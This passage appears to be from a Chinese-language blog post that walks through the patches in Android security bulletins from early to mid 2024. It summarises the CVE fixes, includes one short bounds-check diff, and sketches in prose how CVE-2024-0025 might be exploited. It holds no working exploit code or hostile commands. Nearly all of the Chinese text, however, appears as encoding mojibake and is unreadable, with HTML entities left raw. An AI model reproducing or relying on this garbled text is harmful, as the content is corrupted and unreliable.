æœ‰æœºä¼šè°ƒç”¨åˆ°è¿™é‡Œï¼ŒçŒœæµ‹æ­¤æ¼æ´æ˜¯åœ¨ç®¡ç†å‘˜ç”¨æˆ·å¸è½½å…¶ä»–ç”¨æˆ·çš„åº”ç”¨è€Œå¯¹åº”ç”¨æˆ·å¤„äºéæ´»è·ƒçŠ¶æ€çš„æ—¶å€™è§¦å‘ï¼ŸCVE-2024-31324 EoP High 1å¦‚æœçª—å£æ²¡æœ‰éšè—åŠ¨ç”»ï¼Œéœ€è¦ç«‹å³éšè—å®ƒã€‚è¯´å®è¯ï¼Œæ²¡æ€ä¹ˆçœ‹æ‡‚ï¼Œçœ‹ CVE æè¿°æ˜¯é€šè¿‡ä»¥ç«–å±æ¨¡å¼å¯åŠ¨ activity ç„¶åæ—‹è½¬åˆ°æ¨ªå±æ¨¡å¼å¯ä»¥ç»•è¿‡ç‚¹æŒ‰åŠ«æŒä¿æŠ¤ï¼Œä¼¼ä¹æ˜¯é€»è¾‘æ¼æ´ã€‚ç•™ç»™æœ‰ç¼˜äººåˆ†æå¤ç°å§~~12345678910Hide window immediately if itself doesn&#39;t run hide animationThe condition was overextended in commit 9bca6b4 which checks if theparent container of the window is animating. That causes the window towait for animation finish to update visibility, but the animationfinish callback won&#39;t happen because itself is not animating. Then thewindow that should be hidden remains on screen.Bug: 302431573Test: atest WindowStateTests#testIsOnScreen_hiddenByPolicyCVE-2024-31325 EoP High 1SystemUI è§£æ notification message/conversation ç›¸å…³çš„å›¾ç‰‡ uri æ—¶éœ€è¦ä½¿ç”¨å¯¹åº”ç”¨æˆ·çš„ contextã€‚ä¸ç¡®å®šåœ¨ä»€ä¹ˆæ—¶å€™èƒ½è§¦å‘ã€‚ï¼ˆçœ‹èµ·æ¥æ¼æ´ç±»å‹åº”è¯¥ç»™ ID æ‰å¯¹ï¼Ÿè¿˜æœ‰ä¸ºä»€ä¹ˆæ”¾ framework é‡Œè€Œä¸æ˜¯ systemï¼Ÿï¼‰CVE-2024-31326 EoP High 1 2Android 14 è®¾å¤‡ç®¡ç†ç›¸å…³çš„é…ç½®å­˜å‚¨æ–¹å¼å‘ç”Ÿå˜åŒ–ï¼Œè€Œåˆæ²¡æœ‰æ­£ç¡®è¿ç§»ç›¸å…³é…ç½®ï¼Œå¯¼è‡´è®¾å¤‡ä»æ—§ç‰ˆæœ¬æ›´æ–°åˆ° 14 ä¹‹åè®¾å¤‡ç®¡ç†å‘˜åšå‡ºçš„é™åˆ¶ä¸¢å¤±ã€‚å…·ä½“æ¥è¯´æ˜¯æˆªå›¾ç­–ç•¥ï¼ˆscreen capture policyï¼‰ã€lock task é…ç½®ã€user restrictions è¿™ä¸‰ä¸ªã€‚CVE-2024-31312 ID High 1å¦‚æœè®¾ç½®é”å±éšè—é€šçŸ¥ï¼Œéšè— media carouselï¼ˆåª’ä½“æ“ä½œé¢æ¿ï¼Ÿï¼‰ã€‚CVE-2024-31314 DoS High 1ShortcutService å¯èƒ½ä¼šè°ƒç”¨ UsageStatsManager.reportShortcutUsage()ï¼Œå¯¹è°ƒç”¨é¢‘ç‡æ·»åŠ é™åˆ¶ï¼Œé˜²æ­¢æ‹’ç»æœåŠ¡ã€‚SystemCVE-2023-21113 EoP High 1 2 3å¦‚æœ AttributionSource ååºåˆ—åŒ–ä¸æ˜¯å› ä¸º binder è°ƒç”¨è¢«è§¦å‘ï¼Œæ¸…ç©ºæ‰€æœ‰æƒé™çŠ¶æ€ã€‚CVE-2023-21114 EoP High 1 2 3WiFi æ¨¡å—ä¸­å…ˆæŠŠ AttributionSource ä» bundle æå–å‡ºæ¥å†æŠŠä»»åŠ¡äº¤ç»™å·¥ä½œçº¿ç¨‹å¤„ç†ã€‚ç”±äº android 13 å¼•å…¥çš„ lazy bundle ä¼˜åŒ–ï¼Œå¯¹äº parcelable ç±»å‹åªæœ‰åœ¨è¢«å®é™…è®¿é—®çš„æ—¶å€™æ‰ä¼šè§¦å‘ååºåˆ—åŒ–ï¼Œè€ŒåŸæ¥çš„ä»£ç ä¸­ bundle é‡Œçš„ AttributionSource åœ¨å·¥ä½œçº¿ç¨‹è€Œé binder çº¿ç¨‹ä¸­è¢«è®¿é—®ï¼Œè§¦å‘ååºåˆ—åŒ–æ—¶ Binder.getCallingUid() ç­‰æ–¹æ³•è¿”å›çš„æ˜¯ system server è‡ªå·±çš„ä¿¡æ¯ï¼Œé€ æˆæƒé™ç»•è¿‡ã€‚CVE-2024-31311 EoP High 1libstatssocket å†…æ£€æŸ¥ AStatsEvent çš„ lastFieldPos å¿…é¡»å°äº bufSizeã€‚12345678 // Side-effect: modifies event-&gt;errors if field has too many annotations static void increment_annotation_count(AStatsEvent* event) &#123;+ if (event-&gt;lastFieldPos &gt;= event-&gt;bufSize) &#123;+ return;+ &#125; uint8_t fieldType = event-&gt;buf[event-&gt;lastFieldPos] &amp; 0x0F; uint32_t oldAnnotationCount = (event-&gt;buf[event-&gt;lastFieldPos] &amp; 0xF0) &gt;&gt; 4; uint32_t newAnnotationCount = oldAnnotationCount + 1;CVE-2024-31313 EoP High 1æ¶ˆæ¯é˜Ÿåˆ—é‡Œæ£€æŸ¥è¶Šç•Œæƒ…å†µã€‚CVE-2024-31315 EoP High 1NotificationListenerService rebind åŠæ‰€å±åŒ…æ›´æ–°çš„æ—¶å€™ï¼Œå¦‚æœæ­¤æ—¶è¯¥æœåŠ¡ä¸å†è¢«æƒé™ä¿æŠ¤ï¼ˆæ²¡æœ‰å£°æ˜ android:permissionï¼‰ï¼Œä¸è¦ bind å®ƒã€‚ï¼ˆè¿™ä¹Ÿç®—æ¼æ´ï¼ŸCVE æè¿°åˆçœ‹ä¸äº†ï¼Œä¸æ¸…æ¥šæœ‰æ²¡æœ‰å…¶ä»–è§¦å‘åœºæ™¯ï¼‰æŸ¥çœ‹æè¿°åå‘ç°å’Œä¸Šé¢çš„ CVE-2024-31310 æ˜¯ç±»ä¼¼çš„ï¼šç”¨æˆ·æ‰“å¼€æƒé™ -&gt; apk æ›´æ–°ï¼Œæ–°çš„ apk é‡Œè¿™ä¸ªæœåŠ¡ä¸å†è¢« permission ä¿æŠ¤ -&gt; ç³»ç»Ÿè‡ªåŠ¨é‡ç»‘å®šè¯¥æœåŠ¡ -&gt; ç”¨æˆ·å»è®¾ç½®é‡ŒæŸ¥çœ‹æ—¶ï¼Œç”±äºæ­¤æ—¶è¯¥ service android:permission é…ç½®ä¸å¯¹ï¼Œè¯¥ app ä¸ä¼šè¢«æ˜¾ç¤ºå‡ºæ¥ã€‚Summary: App can read all notifications of the device without requiring any permission.Details: In multiple functions of ManagedServices.java, there is a possible way to hide an app with notification access in the Device &amp; app notifications settings due to improper input validation. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is needed for exploitation.CVE-2024-31323 EoP High 1æ‚¬æµ®çª—è¦†ç›–æ¼æ´é™æ—¶è¿”åœºï¼Œè¿™æ¬¡æ˜¯ Health Connect è¿™ä¸ª app é‡Œã€‚åªå½±å“ 14ã€‚CVE-2024-31327 EoP High 1è¡¥ä¸é“¾æ¥å’Œ CVE-2024-31313 æ˜¯ä¸€æ ·çš„ã€‚2024-06-05KernelCVE-2024-26926 EoP High 1 2å†…æ ¸ binder é©±åŠ¨é‡Œ binder_get_object() æ£€æŸ¥ offset å¿…é¡»æŒ‰ 4 å­—èŠ‚å¯¹é½ã€‚2024-05-01FrameworkCVE-2024-0024 EoP Highåˆ›å»ºç”¨æˆ·æ—¶é™åˆ¶å°†ç”¨æˆ·åã€è´¦å·åã€è´¦å·ç±»å‹è¿™ä¸‰ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå¦åˆ™é•¿åº¦å¯èƒ½ä¼šè¶…å‡º BinaryXmlSerializer çš„å†™å…¥é™åˆ¶ï¼Œå¯¼è‡´åç»­ user restrictions å†™å…¥å¤±è´¥ï¼Œåˆ›å»ºå‡ºæ²¡æœ‰é™åˆ¶çš„ç”¨æˆ·ã€‚ç–‘é—®ï¼šæˆ‘åœ¨ä»Šå¹´1æœˆ4å·å°±å·²ç»åœ¨ aosp ä¸Šçœ‹è§äº†è¿™ä¸ªæäº¤ï¼Œä¸ºä»€ä¹ˆç°åœ¨æ‰æ”¾åœ¨å®‰å…¨å…¬å‘Šé‡Œï¼ŸCVE-2024-0025 EoP Highå‘é€é PendingIntent ç±»å‹çš„ IntentSender æ—¶é¿å…æºå¸¦ allowlist tokenã€‚å› ä¸ºè¿™ä¸ªæ—¶å€™ä¼ å…¥çš„ IIntentSender å®é™…ä¸Šå¯èƒ½æ˜¯ app çš„ä¸€ä¸ª binderï¼Œå†åœ¨ä¸Šé¢è°ƒç”¨ send å®é™…ä¸Šç›¸å½“äºæŠŠ allowlist token ç›´æ¥å‘é€ç»™äº† appï¼Œç„¶åè¿™ä¸ª token å¯ä»¥ç”¨æ¥ç»•è¿‡å¾ˆå¤šçš„åå°é™åˆ¶ã€‚å¤§æ¦‚çŒœæµ‹ä¸€ä¸‹åˆ©ç”¨æ–¹æ³•ï¼šåˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰ IIntentSenderæŠŠå®ƒå¡è¿›ä¸€ä¸ª PendingIntent é‡Œï¼ˆPendingIntent å­˜æ”¾ç€ä¸€ä¸ª IIntentSenderï¼Œè¿™æ˜¯å®ƒçš„çœŸæ­£å®ç°ï¼‰æŠŠ PendingIntent æ”¾è¿› notification deleteIntent é‡Œå‘é€ notification ç„¶åç«‹åˆ»å–æ¶ˆï¼Œè§¦å‘ deleteIntent æ‰§è¡ŒPendingIntent.send() æŠŠå†…éƒ¨çš„ IIntentSender ä¼ é€’åˆ° sendIntentSenderï¼Œå› ä¸ºè¿™ä¸ª IIntentSender ä¸æ˜¯ PendingIntentRecordï¼Œæ‰€ä»¥ IIntentSender.send() è¢«è°ƒç”¨ï¼Œæ­¤æ—¶ä¼šç›´æ¥æŠŠ allowlist token å‘ç»™ appå¦™å•Šï¼Œå¤ªå¦™äº†ç–‘é—®ï¼š1æœˆ4å·æˆ‘ä¹Ÿçœ‹è§äº†è¿™ä¸ªè¡¥ä¸ï¼Œä¸ºä»€ä¹ˆç°åœ¨æ‰å‘å‡ºæ¥ï¼ŸCVE-2024-23705 EoP Highåœ¨ CVE-2024-0024 è¡¥ä¸çš„åŸºç¡€ä¸Šé™åˆ¶ accountOptions çš„å¤§å°ï¼Œé˜²æ­¢ç±»ä¼¼çš„é—®é¢˜ã€‚CVE-2024-23708 EoP Highè®©ç³»ç»Ÿå‘å‡ºçš„ toast ä¼˜å…ˆæ˜¾ç¤ºï¼Œä¿è¯å…¶ä»–åº”ç”¨ä¸èƒ½é€šè¿‡å‘é€å¤§é‡ toast çš„æ–¹å¼å»¶åç³»ç»Ÿ toast æ˜¾ç¤ºã€‚åŒæ—¶æŠŠç²˜è´´å‰ªè´´æ¿æ–‡å­—çš„ toast çš„æ˜¾ç¤ºæ—¶é•¿åŠ åˆ° longã€‚Systemï¼ˆè·³è¿‡ CVE-2024-23709ï¼‰CVE-2024-23706 EoP Criticalandroid health ç›¸å…³çš„åŠŸèƒ½ï¼Œç¦æ­¢æ’å…¥ record types ä¸ºç©ºçš„ changelogã€‚å¯¹è¿™æ¨¡å—ä¸æ˜¯å¾ˆç†Ÿï¼Œæ²¡çœ‹æ‡‚èƒ½å¹²å•¥ï¼Œä¹Ÿæ²¡çœ‹æ‡‚ä¸ºå•¥å®šçº§è¿™ä¹ˆé«˜ï¼Œå¾…è¿›ä¸€æ­¥åˆ†æã€‚CVE æè¿°ï¼šIn multiple locations, there is a possible bypass of health data permissions due to an improper input validation. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.CVE-2024-0043 EoP Highåœ¨ PermissionController åç«¯ç¦æ­¢ç»™ work profile ä¸­çš„åº”ç”¨æˆæƒç›‘å¬é€šçŸ¥ã€‚æ›´æ–°ï¼šæ®åé¦ˆï¼Œæ­¤æ¼æ´è§¦å‘æ–¹å¼æ˜¯é€šè¿‡ companion device watch role è‡ªåŠ¨æˆäºˆç›¸å…³æƒé™ã€‚æ³¨ï¼šå®˜æ–¹å…¬å‘Šé‡Œæ”¾çš„è¡¥ä¸é“¾æ¥ä¼¼ä¹æ˜¯é”™çš„ï¼Œæ­£ç¡®çš„åº”è¯¥æ˜¯ https://cs.android.com/android/_/android/platform/packages/modules/Permission/+/47a06cd49981d3fbe58158e9252f0a825aa109cdCVE-2024-23707 EoP Highç³»ç»Ÿè®¾ç½®é‡Œ SearchResultTrampoline æŠŠåŸæ¥çš„ç”¨ getCallingActivity åˆ¤æ–­è°ƒç”¨è€…æ”¹æˆç”¨ getLaunchedFromPackageï¼Œå‰è€…è¿”å›çš„æ˜¯å“ªä¸ª activity ä¼šæ”¶åˆ° onActivityResult å›è°ƒï¼Œåè€…è¿”å›çš„æ˜¯å®é™…å¯åŠ¨ Activity çš„äººï¼ˆPending intent æŒ‰åˆ›å»ºè€…ç®—ï¼‰2024-04-01è¿™æ¬¡è¡¥ä¸ç»™æˆ‘çš„æ„Ÿè§‰å°±æ˜¯ï¼Œåƒæ„šäººèŠ‚ç‰¹è¾‘FrameworkCVE-2024-23710 EoP Highå¦‚æœä¸€ä¸ª app å’Œç‰¹æƒ app å…±äº« UIDï¼Œå¹¶ä¸”è®¾ç½®äº† sharedUserMaxSdkVersion ä¸”å¤„äºç”Ÿæ•ˆçŠ¶æ€ï¼Œé‚£ä¹ˆ sharedUserId çš„è®¾ç½®æ˜¯æ— æ•ˆçš„ï¼Œè¿™ä¸ªæ—¶å€™ä¸åº”è¯¥æŠŠå®ƒæ ‡è®°ä¸ºç‰¹æƒ appCVE-2024-23713 EoP HighNotificationManagerService migrateNotificationFilter å†…å¦‚æœä¼ å…¥çš„ disallowApps å¹¶æ²¡æœ‰è¢«å®‰è£…å°±è·³è¿‡å®ƒã€‚çŒœæµ‹é—®é¢˜æ˜¯å¯ä»¥ä¼ å…¥è¶…é•¿å­—ç¬¦ä¸²é˜»æ­¢ mRequestedNotificationListeners è¢«åºåˆ—åŒ–ï¼Œä»è€Œé˜»æ­¢æ•°æ®å˜æ›´è¢«ä¿å­˜ï¼ŸCVE-2024-0022 ID HighCompanionDeviceManagerService requestNotificationAccess æ²¡æœ‰æ£€æŸ¥ä¼ å…¥çš„ user idï¼Œè€Œæ˜¯ç•™äº†ä¸ª TODO åœ¨é‚£é‡Œï¼ˆå†™åˆ°ä¸€åŠæƒ³ç€å…ˆè¿™æ ·å®Œäº‹ç„¶åå°±å¿˜äº†ï¼Ÿï¼‰ï¼Œç„¶åç›´æ¥ç”¨è¿™ä¸ª user id å–å¾—ä¸€ä¸ª PendingIntent å¹¶è¿”å›ï¼Œç„¶åå‘é€è¿™ä¸ª pending intent å®é™…ä¸Šå¯ä»¥è·³åˆ°å¯¹åº”ç”¨æˆ·çš„é€šçŸ¥è®¿é—®ç®¡ç†é¡µé¢ã€‚è¿™ä¸ªé—®é¢˜æˆ‘å¾ˆæ—©å°±æ³¨æ„åˆ°äº†ï¼Œä½†æ˜¯åé¦ˆè¢«æ ‡ duplicate äº†ã€‚CVE-2024-23712 DoS HighAppOpsService é‡Œè¿‡æ»¤æœªè¢«å®šä¹‰çš„ proxyAttributionTag ï¼ˆè¿™å•¥ï¼Ÿï¼‰ï¼ŒåŒæ—¶æŠŠä¸€ä¸ªåŒ…é‡Œæœ€å¤§èƒ½å®šä¹‰çš„æ ‡ç­¾çš„æ•°é‡ä» 10000 ä¸‹è°ƒåˆ° 1000ï¼Œé˜²æ­¢å¤§é‡æ•°æ®é€ æˆ DoSã€‚æœ‰å¾…è¿›ä¸€æ­¥åˆ†æã€‚SystemCVE-2024-23704 EoP Highå¦‚æœå½“å‰ç”¨æˆ·æœ‰ DISALLOW_ADD_WIFI_CONFIG è¿™ä¸ªé™åˆ¶ï¼Œä¸å…è®¸æ‰“å¼€ WifiDialogActivityã€‚CVE-2023-21267 ID Highå»å¹´12æœˆçš„è¡¥ä¸ï¼ŒåŸé—®é¢˜æ˜¯æœ‰ app pining çš„æ—¶å€™å°è¯•æŒ‰ç”µæºé”® lockdown ä¼šå› ä¸ºé€»è¾‘é”™è¯¯è·³è¿‡é”å±ã€‚åŸæ¥çš„è¡¥ä¸æœ‰é—®é¢˜ï¼Œå›æ»šäº†ä¹‹åä¿®å¤äº†é—®é¢˜é‡æ–°æäº¤ã€‚CVE-2024-0026/CVE-2024-0027 DoS Highå¤§é‡ snoozed notifications å¯èƒ½å¯¼è‡´çš„æ‹’ç»æœåŠ¡é—®é¢˜ï¼ˆè¿™ä¸ªé—®é¢˜ä¸æ˜¯ä¿®è¿‡å‡ æ¬¡å—æ€ä¹ˆåˆæ¥äº†ï¼Ÿï¼‰ã€‚åˆ¤æ–­ snooze notification æ•°é‡æ˜¯å¦è¶…é™çš„æ—¶å€™è¦æŠŠå·²ç»å­˜è¿›æ–‡ä»¶é‡Œçš„ï¼ˆmPersistedSnoozedNotifications å’Œ mPersistedSnoozedNotificationsWithContextï¼‰ä¸€å¹¶çº³å…¥è®¡ç®—ã€‚è¿˜ä¿®å¤äº† repostGroupSummary æ–¹æ³•é‡Œæ²¡æœ‰æŠŠé€šçŸ¥ä» mPersistedSnoozedNotifications å’Œ mPersistedSnoozedNotificationsWithContext é‡Œç§»é™¤çš„é—®é¢˜ï¼Œä¼šå¯¼è‡´ä¸éœ€è¦çš„é€šçŸ¥æ•°æ®å§‹ç»ˆè¢«åºåˆ—åŒ–ï¼Œå¯èƒ½è¢«æ»¥ç”¨å¯¼è‡´èµ„æºè€—å°½æ‹’ç»æœåŠ¡ã€‚2024-03-01Frameworkï¼ˆè·³è¿‡äº† CVE-2024-0049/CVE-2024-0050/CVE-2024-0051ï¼Œä¸‰ä¸ªéƒ½æ˜¯ libstagefright ä¸­çš„å†…å­˜é”™è¯¯ï¼‰CVE-2024-0044 EoP Highè¿‡æ»¤åº”ç”¨çš„â€œå®‰è£…è€…åŒ…åâ€ï¼ˆå¯ä»¥é€šè¿‡ pm install -i æŒ‡å®šï¼‰é‡Œçš„éæ³•å­—ç¬¦ã€‚æ­¤æ¼æ´ç»†èŠ‚ï¼šæ”»å‡»è€…å¯ä»¥åœ¨â€œå®‰è£…è€…åŒ…åâ€å†…æ’å…¥æ¢è¡Œç¬¦ï¼Œä¹‹åç³»ç»Ÿä¼šæŠŠè¯¥å­—æ®µåŸæ ·å†™è¿› /data/system/packages.list é‡Œï¼Œä¼ªé€ å‡ºæ–°çš„æ¡ç›®ï¼Œä¹‹åå¯ä»¥é€šè¿‡ä¼ªé€ çš„æ¡ç›®æ¬ºéª— run-as ä»è€Œè·å¾—å—å®³åº”ç”¨çš„æƒé™ï¼Œå¯ä»¥æ“ä½œå†…éƒ¨ç›®å½•ç­‰ã€‚å‘ç°è€…çš„åšå®¢å†™çš„å¾ˆæ¸…æ¥šäº†ï¼šhttps://rtx.meta.security/exploitation/2024/03/04/Android-run-as-forgery.htmlæ•°æ®å–è¯ä¸“ç”¨æ¼æ´äº†å±äºæ˜¯CVE-2024-0046 EoP Highé˜»æ­¢ç³»ç»Ÿåº”ç”¨è¢«å‡çº§ä¸º instant appï¼ˆå…å®‰è£…åº”ç”¨ è°·æ­Œå°ç¨‹åºï¼‰ã€‚å…å®‰è£…åº”ç”¨åªèƒ½è·å¾—å¾ˆå°çš„ä¸€éƒ¨åˆ†æƒé™ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ä½¿ç‰¹å®šç³»ç»Ÿåº”ç”¨çš„æƒé™å¤±æ•ˆï¼Œä»è€Œç»•è¿‡è¿è¥å•†é™åˆ¶ã€‚CVE-2024-0048 EoP HighAccountManagerService åˆä¸Šæ–°è¡¥ä¸äº†ã€‚AccountManagerService å†…éƒ¨æœ‰ä¸€ä¸ªè¶…æ—¶æœºåˆ¶ï¼Œbind åˆ° Authenticator åå¦‚æœå®ƒé•¿æ—¶é—´æ²¡å“åº”å°± unbindã€‚æç¬‘çš„æ˜¯ï¼Œä»£ç é‡Œæ ¹æœ¬æ²¡æœ‰ä»»ä½•åœ°æ–¹å¯åŠ¨è¿™ä¸ªæœºåˆ¶ï¼Œæ•´ä¸ªè¶…æ—¶æœºåˆ¶æ ¹æœ¬ä¸ä¼šè¢«è§¦å‘ã€‚AccountManager API æœ€åˆåœ¨ Android 2.1 é‡ŒåŠ å…¥ï¼Œåå‡ å¹´è¿‡å»äº†è¿˜èƒ½æœ‰è¿™ç§é—®é¢˜ï¼Œæå‰é¢„å®šä¸€ä¸ª 2024 å¹´æœ€æç¬‘æ¼æ´ã€‚CVE-2024-0053 ID Highå¦‚æœæ‰“å°æœåŠ¡è¿”å›çš„è‡ªå®šä¹‰çš„æ‰“å°æœºå›¾æ ‡é‡Œçš„ URI æŒ‡å‘å…¶ä»–ç”¨æˆ·å°±æŠŠå®ƒè¿‡æ»¤æ‰ï¼Œé˜²æ­¢çœ‹è§å…¶ä»–ç”¨æˆ·çš„å›¾åƒã€‚æœ€è¿‘è¿™ç§æ¼æ´çœŸçš„å¥½å¤šå¥½å¤šã€‚CVE-2024-0047 DoS HighAndroid 14 ä¸­å¯¹è®¾å¤‡ç®¡ç†ï¼ˆAndroid for Work çš„åŠŸèƒ½ï¼‰çš„é‡æ„ä¸­å¼•å…¥çš„ bugï¼Œè®¾å¤‡ç®¡ç†å‘˜è®¾ç½®çš„ global restrictionï¼ˆå¯¹æ•´ä¸ªè®¾å¤‡çš„é™åˆ¶ï¼‰å¯èƒ½ä¼šè¢«é”™è¯¯è¯†åˆ«ä¸º local restrictionï¼ˆå¯¹å•ä¸ªç”¨æˆ·çš„é™åˆ¶ï¼‰ï¼Œå¯¼è‡´ç®¡ç†å‘˜æ— æ³•æ’¤é”€é™åˆ¶ï¼Œè®¾å¤‡åŠŸèƒ½å—é™ã€‚å°±ç®— bug ä¿®å¥½äº†ï¼Œå·²ç»æŸåçš„é…ç½®æ–‡ä»¶ä»ç„¶æ˜¯æŸåçš„ï¼Œä¸ºäº†è®©è¿™äº›è®¾å¤‡ä¸æ¸…é™¤æ•°æ®å°±èƒ½æ­£å¸¸å·¥ä½œè¿˜è¦åŠ ä¸ª workaroundã€‚Systemï¼ˆè·³è¿‡äº† CVE-2024-0039ã€CVE-2024-23717ã€CVE-2024-0045ï¼‰CVE-2023-40081 ID HighSystemUI åŠ è½½å¤šåª’ä½“æ–‡ä»¶çš„å›¾æ ‡æ—¶æ£€æŸ¥ URI æƒé™ï¼Œé˜²æ­¢è·¨ç”¨æˆ·è¯»å–CVE-2024-0052 ID Highå¯¹ Android Health è¿™ä¸ªåŠŸèƒ½ä¸æ˜¯å¾ˆç†Ÿï¼Œçœ‹æäº¤ä¿¡æ¯æ˜¯å¦‚æœè°ƒç”¨è€…æ²¡æœ‰æƒé™ï¼Œéƒ¨åˆ† API è¿”å›çš„æ•°æ®è¦å»é™¤æ‰ç”¨æˆ·è¿åŠ¨çš„è·¯çº¿ä¿¡æ¯ã€‚2024-02-01FrameworkCVE-2024-0029 EoP HighDevicePolicyManagerService é‡Œçš„é€»è¾‘ bugï¼Œä¿å­˜ç¦æ­¢æˆªå±çš„çŠ¶æ€çš„æ—¶å€™åªç”¨äº†ä¸€ä¸ª int ä¿å­˜è¢«ç¦ç”¨çš„ç”¨æˆ· idï¼Œåœ¨æœªå—ç®¡ç”¨æˆ·å¯åŠ¨çš„æ—¶å€™ä¼šè¦†ç›–æ‰ä¹‹å‰è®¾ç½®çš„ã€‚CVE-2024-0032 EoP HighDownloadStorageProvider æ­£ç¡®é‡å†™å¸¦æœ‰ includeHidden å‚æ•°çš„ queryChildDocuments()ã€‚æ›´å¤šå¯å‚è€ƒ https://t.me/qianqianzhuang/4CVE-2024-0034 EoP Highé˜»æ­¢å£çº¸æœåŠ¡ä»åå°å¯åŠ¨ activityã€‚å› ä¸ºå‰å°å®¢æˆ·ç«¯ç»‘å®šå£çº¸æœåŠ¡ä¹‹åï¼Œä¼šæ»¡è¶³è¿™ä¸€æ¡è±å…æ¡ä»¶ â€œè¯¥åº”ç”¨çš„ä¸€é¡¹æœåŠ¡è¢«å¦ä¸€ä¸ªå¯è§çš„åº”ç”¨ç»‘å®šã€‚ç»‘å®šåˆ°è¯¥æœåŠ¡çš„åº”ç”¨å¿…é¡»ä¿æŒå¯è§ï¼Œä»¥ä¾¿åå°åº”ç”¨æˆåŠŸå¯åŠ¨ activityã€‚â€å®‰å“ 14 çš„ BAL å¼ºåŒ–ä¸­é™åˆ¶äº† target&gt;=U æ—¶å¿…é¡»æŒ‡å®š BIND_ALLOW_ACTIVITY_STARTS æ‰å…è®¸æœåŠ¡è¿›ç¨‹å€Ÿç”¨å®¢æˆ·è¿›ç¨‹çš„çŠ¶æ€å¯åŠ¨ï¼Œæ•…è¯¥æ¼æ´ä¸å½±å“ 14CVE-2024-0036 EoP HighstartNextMatchingActivity ä¸­è®¾ç½® setAvoidMoveToFront é˜»æ­¢åå°å¯åŠ¨ activityï¼Œå…·ä½“å¯è§ https://mp.weixin.qq.com/s/dbupJ3D-i0Da9ml1Pamu-wè¿™ä¸ªæ¥å£æ¼äº†è¿™ä¹ˆä¹…éƒ½æ²¡äººæ³¨æ„åˆ°ç¡®å®æŒºéš¾å¾—çš„ï¼Œå½“ç„¶æˆ‘ä¹Ÿæ²¡æ³¨æ„åˆ°ï¼Œä½†æ˜¯ä½ çœ‹åˆ«äººéƒ½æ²¡æ³¨æ„åˆ°ï¼Œæ‰€ä»¥ä¹Ÿä¸èƒ½æ€ªæˆ‘ï¼Œä½ è¯´æ˜¯å§CVE-2024-0038 EoP HighinjectInputEventToInputFilter ä¸­ç¼ºå¤±è°ƒç”¨è€…æƒé™æ£€æŸ¥ï¼Œåªå½±å“ 14CVE-2024-0041 EoP HighremovePersistentDot é‡Œçš„ç«æ€æ¡ä»¶ï¼Œæœ‰å¯èƒ½å¯¼è‡´ persistent dot ä¸ä¼šç§»é™¤ï¼ˆç„¶åä¼šè¦†ç›–æ–°æ˜¾ç¤ºçš„çŠ¶æ€ï¼Ÿï¼‰CVE-2023-40122 &amp; CVE-2024-0037 EoP Highæ£€æŸ¥è‡ªåŠ¨å¡«å……ç›¸å…³ä¼ å…¥çš„ URIï¼Œç¡®ä¿ä¸ä¼šè¯»å–åˆ°å…¶ä»–ç”¨æˆ·çš„æ•°æ®CVE-2024-0040 ID HighMTP åè®®å¤„ç†ä¸­æ²¡æœ‰æ­£ç¡®å¢å¤§ç¼“å†²åŒºå¤§å°ï¼Œå¯èƒ½å‘ç”Ÿè¶Šç•Œè¯»SystemCVE-2024-0031 RCE Criticalè“ç‰™ GATT åè®®æ ˆé‡Œçš„è¶Šç•Œå†™ï¼Œç†è®ºå¯å®ç° RCEã€‚è¿™ç©æ„çœŸçš„å‡ ä¹æ¯ä¸ªæœˆéƒ½èƒ½æä¸€ä¸ª RCE å‡ºæ¥ã€‚CVE-2024-0014 EoP Highè¯¥æ¼æ´æœªå…¬å¼€è¡¥ä¸é“¾æ¥ï¼Œä¼¼ä¹æ˜¯ GMS ç§æœ‰ç»„ä»¶ã€‚æ¼æ´æè¿°ï¼šIn startInstall of UpdateFetcher.java, there is a possible way to trigger a malicious config update due to a logic error. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.CVE-2024-0033 EoP Highlibbinder æ‰“å¼€ memfd æ—¶æŒ‡å®š F_SEAL_GROW | F_SEAL_SHRINK é˜»æ­¢åç»­å…¶ä»–è¿›ç¨‹æ›´æ”¹å¤§å°é€ æˆé”™è¯¯CVE-2024-0035 EoP HighTileService è¿”å› null æ—¶æ­£ç¡®é‡Šæ”¾èµ„æºï¼Œé˜»æ­¢ç»•è¿‡åå°å¯åŠ¨å‰å° activity çš„é™åˆ¶ã€‚æ›´å¤šå¯ä»¥å‚è€ƒ https://wrlus.com/android-security/bindservice-error-handle/CVE-2023-40093 ID Highå‡çº§ pdfium åˆ° Chrome 114.0.5735.130 çš„CVE-2024-0030 ID Highè“ç‰™ç»„ä»¶é‡Œä¸å……åˆ†çš„æ£€æŸ¥å¯èƒ½é€ æˆè¶Šç•Œè¯»2024-01-01FrameworkCVE-2023-21245 EoP Highé˜»æ­¢åœ¨è®¾å¤‡è®¾ç½®å‘å¯¼å®Œæˆä¹‹å‰è¿›å…¥é”å±ï¼Œå¯ä»¥æ’å…¥ä¸€å¼ éœ€è¦ PIN/PUK ç è§£é”çš„ SIM å¡å¤ç°ã€‚åº”è¯¥æ˜¯å¯ä»¥ç»•è¿‡æ¢å¤å‡ºå‚ä¿æŠ¤ï¼ˆFRPï¼ŒFactory Reset Protectionï¼‰ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„æ¿€æ´»é”ã€‚CVE-2024-0015 EoP Highä¿è¯ DreamService é…ç½®çš„ settingsActivity å±äºåº”ç”¨è‡ªèº«ï¼Œé˜²æ­¢è°ƒç”¨åˆ°éå…¬å¼€çš„ activity é€ æˆ launch anywhereã€‚å‘ä¸Šæœç´¢å¯ä»¥å‘ç° SettingsLib çš„ DreamBackend launchSettings() è¿™ä¸ªæ–¹æ³•ä¼šç›´æ¥ startActivityï¼Œè¿™é‡Œåœ¨ Settings é‡Œè¿è¡Œæ‰€ä»¥æ˜¯ system æƒé™ã€‚é¢˜å¤–è¯ï¼šDreamService æ˜¯ Android 4.2 åŠ å…¥çš„ï¼Œåå‡ å¹´è¿‡å»äº†ï¼Œç›¸å…³ä»£ç 